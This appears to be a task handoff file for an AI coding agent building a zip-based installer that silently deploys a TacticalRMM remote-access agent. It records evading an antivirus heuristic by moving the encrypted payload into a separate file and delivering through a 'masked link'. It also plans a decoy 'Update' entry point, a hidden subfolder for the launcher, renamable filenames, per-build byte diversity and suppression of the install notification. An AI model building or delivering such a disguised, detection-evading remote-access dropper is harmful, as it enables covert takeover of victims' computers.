# TASK — Launcher ZIP acceptance (2026-09-15): file-path, zip structure, renamable names, silent install

## Where we are (stage status)

- **Core flow is DONE and ACCEPTED (2026-09-15):** download `Agent.zip` through the frontend/masked link -> extract
  -> double-click `Update.lnk` -> **UAC** -> agent installs to `C:\Program Files\TacticalAgent\tacticalrmm.exe` ->
  `tacticalrmm` + `Mesh Agent` services **Running** -> device **Online** in RMM. "TRMM installed" shown. Verified.
- A desktop-AV **machine-learning heuristic** flagged the launcher's old shape at **download time**; fixed (Option A)
  by moving the encrypted payload out of `Launcher.exe` into sibling `agent.bin` (`FLAG_PAYLOAD_EXTERNAL 0x02`).
  `Launcher.exe` is now ~50 KB; the zip is `{Update.lnk, Launcher.exe, agent.bin}`. **Re-download verified clean.**
- Guardrails you MUST keep: AMSI stays `none`; do NOT weaken `/build` auth; do NOT change `LATEST_AGENT_VER`; NO
  code-sign token. Accept ONLY via the real download flow (frontend -> masked link -> VM -> double-click), never ssh/scp.

## Current zip / generator facts (don't re-derive)

- **FIX 1 STATUS (2026-09-15):** Implemented in `vantra-installer` (committed, pushed). Entry point switched from the
  non-portable `Update.lnk` to a top-level **`Update.cmd`** bootstrap (`start "" "%~dp0Launcher.exe"`).
  `LAUNCHER_LNK_TARGET` removed from `env.ts` + `launcher-build.ts` (no more baked absolute path). Shipped zip =
  `{Update.cmd, Launcher.exe, agent.bin}`. **NOT yet deployed/accepted** via the live VM download test (pending).
- Files: `launcher-overlay.ts` (`assembleOverlay`/`buildAgentBin`/`decryptOverlay`, external flag), `launcher-build.ts`
  (builds stamped Launcher + agent.bin + Update.cmd bootstrap, 3-entry zip — no longer invokes pwsh for the .lnk),
  `launcher-validate.ts` (server-side report card incl. Update.cmd bootstrap-shape + trigram scan, round-trip),
  `storage.ts` (paths incl. `agentBinOutputPath`, `cmdBootstrapOutputPath`), native `launcher.c`/`overlay.c` (reads
  `agent.bin` sibling of `argv[0]`).
- **Mechanism chosen (FIX 1 = Option 2, Update.cmd bootstrap):** a real `.cmd` resolves `%~dp0` = its own folder, so
  it launches `Launcher.exe` from ANY extract folder (Downloads/Desktop/anywhere); `Launcher.exe`'s
  `requireAdministrator` manifest still raises UAC. Option 1 (portable relative-IDList `.lnk`) was NOT used because
  this host's earlier test already proved a bare relative `.lnk` does not resolve on double-click (ShellExecute ->
  "No application is associated"; WScript reads an empty `TargetPath`). A per-build `rem` nonce keeps `Update.cmd`
  byte-unique per build (diversity guard). `New-AgentShortcut.ps1`'s `-LauncherMode` .lnk writer is retained for the
  future relative-IDList work but is no longer invoked by the default launcher build.

---

## FIX 1 — portable file path (IMPLEMENTED via Update.cmd bootstrap; NOT yet VM-accepted)

**Status (2026-09-15):** Code implemented + typechecked. Chose **Option 2 (`Update.cmd` bootstrap)** — see facts
section for the evidence/decision. Remaining acceptance: real download -> unzip anywhere -> double-click `Update.cmd`
-> UAC -> Online. The portability bug is fixed once a non-pinned double-click works.

**Goal:** the launch entry works from wherever the user unzips (Downloads, Desktop, anywhere) — no hand-made folder.
**Root cause (RESOLVED):** `LAUNCHER_LNK_TARGET` baked an absolute path
(`C:/Users/myrat/Desktop/VantraFinal/Launcher.exe`) into the `.lnk`, so it failed unless files were in that exact
folder. Now removed; the `Update.cmd` bootstrap ships instead.
**What's already safe:** the launcher locates itself via `argv[0]` and reads sibling `agent.bin` from its own folder,
so only the `.lnk` target is hard-pinned.

**Decide the mechanism by test, then implement + accept via download:**
1. **Preferred (keep .lnk + UAC):** generate a CORRECT portable relative `.lnk` that Windows actually resolves. A bare
   relative path is not enough (see facts). Proper approach: a `.lnk` whose **LinkTargetIDList is a RELATIVE shell-item
   list** (created like a Ctrl+Shift drag "relative shortcut"), with `HasLinkTargetIDList` + `HasRelativePath` and the
   relative path. Test on the VM from an arbitrary folder (ShellExecute/`Invoke-Item` must launch the sibling exe and a
   UAC must appear). If this resolves portably -> ship default `-LauncherTarget` relative and drop `LAUNCHER_LNK_TARGET`.
2. **Fallback (simplest, guaranteed portable):** ship a top-level **`Update.cmd`** bootstrap next to the `.lnk`
   structure: one line `@start "" "%~dp0<foldername>\Launcher.exe"`. `.cmd` resolves `%~dp0` = its own folder, so it
   works from any location and `Launcher.exe` (requireAdministrator) still raises UAC. Use this if (1) can't be made
   to resolve end-to-end. Keep `.lnk` as an option only where its target is proven-resolvable.
3. Record which mechanism was chosen (test evidence) in this file. Remove `LAUNCHER_LNK_TARGET` / the baked absolute
   path from `env.ts` + `launcher-build.ts` so builds never ship a stale absolute path.

**Files:** `generator/src/env.ts`, `generator/src/launcher-build.ts`, `generator/src/New-AgentShortcut.ps1`, and the
chosen bootstrap (zip-builder / a new Update.cmd if applicable).
**Accept:** fresh frontend zip downloaded via masked link into VM `Downloads` -> unzip anywhere -> double-click ->
UAC -> services Running -> device Online. No manual copy/folder steps.

## FIX 2 — zip structure (launcher in a subfolder; only Update visible first)

**Wanted:** on unzip, the user sees `Update.lnk` (their double-click entry) at the top; the launcher + payload live in
a sub folder. e.g.
```
Agent.zip
  Update.lnk                 <- top-level, double-click me
  <inner>\Launcher.exe
  <inner>\agent.bin
```
**Files:** `generator/src/launcher-build.ts` (createZip entry names), `storage.ts` (write launcher/agent.bin under the
inner path), and the `.lnk` target/form (`New-AgentShortcut.ps1`) must point at `<inner>\Launcher.exe` via whichever
mechanism FIX 1 chose.
**Accept:** unzip shows Update.lnk at top level and launching it works via the FIX 1 mechanism.

## FIX 3 — renamable names (from the UI at zip creation)

**Wanted:** `Agent.zip`, `Update.lnk`, `Launcher.exe`, `agent.bin`, and the inner folder name settable when the zip is
created (frontend/web-app input -> passed through to the generator).
**Files:** the web app (vantra) create-zip UI + the `POST /build` body (add e.g. `fileName`, `innerFolder`,
`launcherName`, `payloadName`, `zipName`), and `generator/src/launcher-build.ts`+`storage.ts`+`routes.ts` must thread
them through (names used in `createZip`, `launcherOutputPath`, `agentBinOutputPath`, and the `.lnk` target).
**Accept:** generating a zip from the UI with custom names yields a zip whose files/folder carry those names and still
double-click -> UAC -> Online.## FIX 4 — silent install (suppress the agent's post-install notification)

**Wanted:** the agent must NOT pop a desktop notification after install (Vantra will show its own later).
**Files:** agent install path. This is the TacticalRMM agent's own post-install notification; suppress via the agent's
install flags / its notifier config if one exists, OR via a policy/registry toggle, and verify no balloon/toast after
install. Prefer a switch already supported by the agent (`-m install ...`) or its config; do NOT weaken AV/AMSI.
**Accept:** after double-click + UAC + install, no Windows notification appears, yet services start + device Online.

---

## Straight command for the next agent (fix each, in order, testing each)

> Start from stage **"core launcher flow accepted; AV nuisance fixed; zip = {Update.lnk, Launcher.exe, agent.bin}"**.
>
> 1. **Fix the file-path bug** (`Update.lnk` is pinned to an absolute folder and won't open from Downloads / any
>    other extract folder): implement FIX 1 (preferably a resolving relative-`.lnk`, else the `Update.cmd` `%~dp0`
>    bootstrap), drop the baked `LAUNCHER_LNK_TARGET`, and **test via a real download** into the VM's Downloads ->
>    unzip anywhere -> double-click -> UAC -> Online. Stop when a non-pinned double-click works.
> 2. **Restructure the zip** (FIX 2): launcher + `agent.bin` in a subfolder; `Update.lnk` top-level pointing there;
>    re-test FIX 1 through the new structure (download -> unzip -> double-click).
> 3. **Make the names renamable from the UI** (FIX 3): thread `zipName`, `fileName/updateLink`, `launcherName`,
>    `payloadName`, `innerFolder` from the web app through `/build` into the zip + `.lnk`; test with custom names.
> 4. **Silence the post-install notification** (FIX 4): find/set the agent's quiet-install option; verify no toast.
>
> Each step: implement the smallest change, redeploy (`/opt/vantra-installer/generator`,
> `systemctl restart vantra-msi-generator`), regenerate from the web app, and accept via the masked-link download +
> double-click on the VM. Update this file's status after each.
>
> Guardrails: AMSI `none`, `/build` auth not weakened, `LATEST_AGENT_VER` unchanged, no code-sign token.
> **Definition of all-done:** a fresh UI-generated, custom-named zip downloads through the link, unzips showing only
> `Update.lnk` at the top, double-click (from any folder) -> UAC -> no notification -> both services Running -> device
> Online. Record evidence under "Test task" below.

---

## Test task (short, once FIX 1 is in)

On the VM, from an untouched folder (e.g. `%USERPROFILE%\Downloads`), using the freshly generated zip:
1. Download via the masked link (real flow). Expect: no AV block.
2. Extract anywhere. Expect: `Update.lnk` at top (launcher in its subfolder per FIX 2), then double-click it.
3. Double-click `Update.lnk`. Expect: UAC; then `tacticalrmm` + `Mesh Agent` services **Running**; device **Online**
   in RMM; no post-install notification (after FIX 4).
4. If you had to click anything extra, log it — that's a residual bug.
Record results here when done.